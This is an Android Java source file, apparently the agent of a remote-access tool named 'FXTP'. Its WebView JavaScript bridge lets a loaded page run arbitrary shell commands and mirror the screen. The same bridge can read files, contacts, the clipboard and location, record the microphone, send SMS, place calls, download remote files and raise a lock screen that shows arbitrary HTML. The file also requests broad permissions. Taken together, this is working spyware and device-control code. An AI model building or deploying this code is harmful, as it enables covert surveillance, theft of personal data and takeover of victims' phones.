package com.fxtp.agent;

import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private Handler backgroundHandler;
    private MediaRecorder audioRecorder;
    private String audioFilePath;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isMirroring = false;
    private Handler mirrorHandler;
    private Runnable mirrorRunnable;
    private boolean isRecording = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Background thread for heavy tasks
        backgroundHandler = new Handler(Looper.getMainLooper()); // we'll use a separate thread later

        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);

        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.addJavascriptInterface(new AndroidBridge(), "AndroidBridge");

        webView.loadUrl("file:///android_asset/device.html");

        requestPermissionsIfNeeded();

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                if (chars.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }

        Log.d("FXTP", "App started");
    }

    // ==================== ANDROID BRIDGE ====================
    private class AndroidBridge {

        @JavascriptInterface
        public void log(String msg) {
            Log.d("FXTP", msg);
        }

        @JavascriptInterface
        public String ping() {
            return "pong";
        }

        // --- Screenshot ---
        @JavascriptInterface
        public String takeScreenshot() {
            try {
                DisplayMetrics dm = getResources().getDisplayMetrics();
                int width = dm.widthPixels;
                int height = dm.heightPixels;
                Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                getWindow().getDecorView().draw(canvas);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Mirror (fixed – uses background thread for capture) ---
        @JavascriptInterface
        public String startMirror() {
            if (isMirroring) return "Already mirroring";
            isMirroring = true;
            // Use a separate thread to avoid blocking UI
            new Thread(() -> {
                while (isMirroring) {
                    try {
                        // Capture screenshot on UI thread
                        mainHandler.post(() -> {
                            try {
                                String result = takeScreenshot();
                                webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('mirror_frame', '" + result.replace("\\", "\\\\").replace("'", "\\'") + "');");
                            } catch (Exception e) {
                                Log.e("FXTP", "Mirror capture error", e);
                            }
                        });
                        Thread.sleep(200); // 5 fps
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }).start();
            return "Mirror started";
        }

        @JavascriptInterface
        public String stopMirror() {
            isMirroring = false;
            return "Mirror stopped";
        }

        // --- Shell (runs on background) ---
        @JavascriptInterface
        public String runShell(String cmd) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder out = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) out.append(line).append("\n");
                p.waitFor();
                return out.toString();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Launch App ---
        @JavascriptInterface
        public String launchApp(String pkg) {
            try {
                Intent i = getPackageManager().getLaunchIntentForPackage(pkg);
                if (i != null) {
                    startActivity(i);
                    return "Launched: " + pkg;
                } else {
                    return "App not found: " + pkg;
                }
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- File Manager ---
        @JavascriptInterface
        public String listFiles(String path) {
            try {
                File dir = new File(path);
                if (!dir.exists()) return "Path not found: " + path;
                File[] files = dir.listFiles();
                JSONArray arr = new JSONArray();
                if (files != null) {
                    for (File f : files) {
                        JSONObject obj = new JSONObject();
                        obj.put("name", f.getName());
                        obj.put("isDir", f.isDirectory());
                        obj.put("size", f.length());
                        arr.put(obj);
                    }
                }
                return arr.toString();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        @JavascriptInterface
        public String downloadFile(String path) {
            try {
                File f = new File(path);
                if (!f.exists()) return "File not found";
                FileInputStream fis = new FileInputStream(f);
                byte[] data = new byte[(int) f.length()];
                fis.read(data);
                fis.close();
                return Base64.encodeToString(data, Base64.DEFAULT);
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Notification ---
        @JavascriptInterface
        public String sendNotification(String msg) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    NotificationChannel ch = new NotificationChannel("fxtp_ch", "FXTP", NotificationManager.IMPORTANCE_HIGH);
                    NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    if (mgr != null) mgr.createNotificationChannel(ch);
                }
                NotificationCompat.Builder b = new NotificationCompat.Builder(MainActivity.this, "fxtp_ch")
                        .setContentTitle("FXTP")
                        .setContentText(msg)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setAutoCancel(true);
                NotificationManager mgr = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (mgr != null) {
                    mgr.notify((int) System.currentTimeMillis(), b.build());
                    return "Notification sent";
                }
                return "Notification manager not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Clipboard ---
        @JavascriptInterface
        public String setClipboard(String text) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null) {
                    cm.setPrimaryClip(ClipData.newPlainText("FXTP", text));
                    return "Copied to clipboard";
                }
                return "Clipboard not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        @JavascriptInterface
        public String getClipboard() {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (cm != null && cm.hasPrimaryClip()) {
                    return cm.getPrimaryClip().getItemAt(0).getText().toString();
                }
                return "No clipboard content";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- SMS ---
        @JavascriptInterface
        public String sendSms(String data) {
            try {
                String[] parts = data.split("\\|");
                if (parts.length < 2) return "Format: number|message";
                String number = parts[0].trim();
                String message = parts[1].trim();
                SmsManager sm = SmsManager.getDefault();
                sm.sendTextMessage(number, null, message, null, null);
                return "SMS sent to " + number;
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Contacts ---
        @JavascriptInterface
        public String getContacts() {
            try {
                ContentResolver cr = getContentResolver();
                Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                JSONArray arr = new JSONArray();
                if (cur != null) {
                    while (cur.moveToNext()) {
                        String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        JSONObject obj = new JSONObject();
                        obj.put("name", name);
                        obj.put("number", number);
                        arr.put(obj);
                    }
                    cur.close();
                }
                return arr.toString();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Location ---
        @JavascriptInterface
        public String getLocation() {
            try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(Context.LOCATION_SERVICE);
                if (ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    return "Location permission not granted";
                }
                Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    JSONObject obj = new JSONObject();
                    obj.put("lat", loc.getLatitude());
                    obj.put("lng", loc.getLongitude());
                    obj.put("alt", loc.getAltitude());
                    obj.put("accuracy", loc.getAccuracy());
                    return obj.toString();
                }
                return "Location not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Camera ---
        @JavascriptInterface
        public String captureCamera() {
            try {
                Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                startActivityForResult(intent, 200);
                return "Camera opened";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Audio Recording (fixed) ---
        @JavascriptInterface
        public String startAudioRecording(int duration) {
            if (isRecording) return "Already recording";
            if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                return "Record audio permission not granted";
            }
            try {
                audioFilePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
                audioRecorder = new MediaRecorder();
                audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                audioRecorder.setOutputFile(audioFilePath);
                audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                audioRecorder.prepare();
                audioRecorder.start();
                isRecording = true;
                // Schedule stop after duration
                mainHandler.postDelayed(() -> {
                    stopAudioRecording();
                }, duration * 1000L);
                return "Recording started for " + duration + "s";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        private void stopAudioRecording() {
            if (audioRecorder != null && isRecording) {
                try {
                    audioRecorder.stop();
                    audioRecorder.release();
                    audioRecorder = null;
                    isRecording = false;
                    File f = new File(audioFilePath);
                    if (f.exists()) {
                        FileInputStream fis = new FileInputStream(f);
                        byte[] data = new byte[(int) f.length()];
                        fis.read(data);
                        fis.close();
                        String base64 = Base64.encodeToString(data, Base64.DEFAULT);
                        webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', '" + base64 + "');");
                    } else {
                        webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', 'ERROR: File not found');");
                    }
                } catch (Exception e) {
                    Log.e("FXTP", "Audio stop error", e);
                    webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('audio_data', 'ERROR: " + e.getMessage() + "');");
                }
            }
        }

        // --- Device Info ---
        @JavascriptInterface
        public String getDeviceInfo() {
            try {
                JSONObject obj = new JSONObject();
                obj.put("model", Build.MODEL);
                obj.put("brand", Build.BRAND);
                obj.put("android", Build.VERSION.RELEASE);
                obj.put("sdk", Build.VERSION.SDK_INT);
                obj.put("battery", getBatteryLevel());
                obj.put("storage_total", getTotalStorage());
                obj.put("storage_free", getFreeStorage());
                obj.put("ip", getLocalIpAddress());
                obj.put("carrier", getCarrier());
                return obj.toString();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        private int getBatteryLevel() {
            android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
            return 0;
        }

        private String getTotalStorage() {
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long bytes = stat.getTotalBytes();
            return android.text.format.Formatter.formatFileSize(MainActivity.this, bytes);
        }

        private String getFreeStorage() {
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long bytes = stat.getFreeBytes();
            return android.text.format.Formatter.formatFileSize(MainActivity.this, bytes);
        }

        private String getLocalIpAddress() {
            try {
                for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                    NetworkInterface intf = en.nextElement();
                    for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                        InetAddress inetAddress = enumIpAddr.nextElement();
                        if (!inetAddress.isLoopbackAddress()) {
                            return inetAddress.getHostAddress();
                        }
                    }
                }
            } catch (Exception e) {}
            return "unknown";
        }

        private String getCarrier() {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) return tm.getNetworkOperatorName();
            return "unknown";
        }

        // --- Packages ---
        @JavascriptInterface
        public String getPackages() {
            try {
                List<android.content.pm.PackageInfo> packs = getPackageManager().getInstalledPackages(0);
                JSONArray arr = new JSONArray();
                for (android.content.pm.PackageInfo p : packs) {
                    arr.put(p.packageName);
                }
                return arr.toString();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- WiFi ---
        @JavascriptInterface
        public String scanWifi() {
            try {
                WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    wm.startScan();
                    List<android.net.wifi.ScanResult> results = wm.getScanResults();
                    JSONArray arr = new JSONArray();
                    for (android.net.wifi.ScanResult r : results) {
                        JSONObject obj = new JSONObject();
                        obj.put("ssid", r.SSID);
                        obj.put("rssi", r.level);
                        arr.put(obj);
                    }
                    return arr.toString();
                }
                return "WiFi not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Flashlight ---
        @JavascriptInterface
        public String toggleFlashlight(boolean on) {
            try {
                cameraManager.setTorchMode(cameraId, on);
                return on ? "ON" : "OFF";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Vibrate ---
        @JavascriptInterface
        public String vibrate(int duration) {
            try {
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    v.vibrate(duration);
                    return "Vibrated for " + duration + "ms";
                }
                return "Vibrator not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Brightness (fixed) ---
        @JavascriptInterface
        public String setBrightness(int value) {
            try {
                mainHandler.post(() -> {
                    try {
                        WindowManager.LayoutParams lp = getWindow().getAttributes();
                        lp.screenBrightness = Math.max(0.01f, Math.min(1f, value / 100f));
                        getWindow().setAttributes(lp);
                    } catch (Exception e) {
                        Log.e("FXTP", "Brightness error", e);
                    }
                });
                return "Set to " + value + "%";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Volume ---
        @JavascriptInterface
        public String setVolume(int value) {
            try {
                android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
                    am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, Math.min(max, value * max / 100), 0);
                    return "Set to " + value + "%";
                }
                return "AudioManager not available";
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Download from URL ---
        @JavascriptInterface
        public String downloadFromUrl(String urlStr) {
            try {
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.connect();
                InputStream in = conn.getInputStream();
                File outFile = new File(getExternalFilesDir(null), "downloaded_file");
                FileOutputStream fos = new FileOutputStream(outFile);
                byte[] buffer = new byte[4096];
                int len;
                while ((len = in.read(buffer)) != -1) fos.write(buffer, 0, len);
                fos.close();
                in.close();
                return "Downloaded to " + outFile.getAbsolutePath();
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Call ---
        @JavascriptInterface
        public String makeCall(String number) {
            try {
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(Uri.parse("tel:" + number));
                if (ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                    startActivity(intent);
                    return "Calling " + number;
                } else {
                    return "Call permission not granted";
                }
            } catch (Exception e) {
                return "ERROR: " + e.getMessage();
            }
        }

        // --- Lock Screen ---
        @JavascriptInterface
        public String startLockScreen() {
            Intent lockIntent = new Intent(MainActivity.this, LockActivity.class);
            lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(lockIntent);
            return "Lock screen activated";
        }

        // --- Display HTML ---
        @JavascriptInterface
        public String displayHtml(String html) {
            Intent intent = new Intent(MainActivity.this, LockActivity.class);
            intent.putExtra("html_content", html);
            intent.putExtra("display_html", true);
            startActivity(intent);
            return "HTML displayed";
        }
    }

    // ==================== PERMISSIONS ====================
    private void requestPermissionsIfNeeded() {
        String[] perms = {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_WIFI_STATE,
                android.Manifest.permission.CHANGE_WIFI_STATE,
                android.Manifest.permission.SYSTEM_ALERT_WINDOW
        };
        List<String> needed = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 1001);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 200 && resultCode == RESULT_OK) {
            Bitmap bitmap = (Bitmap) data.getExtras().get("data");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
            String base64 = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
            webView.loadUrl("javascript:if(window.handleBridgeResult) window.handleBridgeResult('camera_data', '" + base64 + "');");
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isMirroring = false;
        if (audioRecorder != null) {
            try {
                audioRecorder.stop();
                audioRecorder.release();
            } catch (Exception e) {}
            audioRecorder = null;
        }
    }
                                                         }
